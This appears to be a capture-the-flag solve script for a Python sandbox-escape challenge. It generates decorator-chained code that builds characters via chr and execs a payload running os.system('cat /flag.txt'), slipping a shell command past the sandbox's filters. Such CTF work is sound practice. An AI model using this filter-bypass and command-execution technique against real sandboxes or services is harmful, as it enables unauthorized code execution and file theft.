out = 'def myfunc(nums):'

for c in range(32, 127):
    cod = f'''
    def inner(*args):
        return {c}
    @chr
    @inner
    def _{c}():
        return 0
    '''

    out += cod

payload = '__import__("os").system("cat /flag.txt")'

out += f'''
    def inner(*args):
        return {' + '.join([f"_{ord(c)}" for c in payload])}

    @exec
    @inner
    def _exec():
        return 0
    
    return nums
'''

with open('solve.py', 'w') as f:
    f.write(out)